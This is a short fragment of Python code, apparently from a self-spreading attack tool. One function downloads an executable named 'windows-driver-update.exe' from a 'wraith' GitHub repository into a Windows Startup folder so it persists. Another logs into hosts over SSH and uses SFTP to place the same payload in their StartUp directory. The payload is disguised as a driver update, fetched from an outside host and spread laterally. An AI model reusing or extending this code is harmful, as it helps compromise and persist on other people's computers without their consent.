...
def download_wraith():
    ...
    logger.debug("Downloading wraith...")
    url = "https://github.com/OfficalMINI/wraith/raw/main/windows-driver-update.exe"
    urllib.request.urlretrieve(url, r'C:\Users\Jeandre\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windows-driver-update.exe')
    logger.debug("Wraith downloaded!")
    os.system('"C:/Windows/System32/notepad.exe"')
    logger.debug("Wraith Run Succesfuly!")
...
def connect_to_ssh(host, password):
    ...
    # Download Payload
    url = "https://github.com/OfficalMINI/wraith/raw/main/windows-driver-update.exe"
    #download the file and save it as "windows_driver.exe"
    urllib.request.urlretrieve(url, "windows_driver.exe") 
    ...
    try:
        ...
        sftp.put('windows_driver.exe', "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp") # change this.
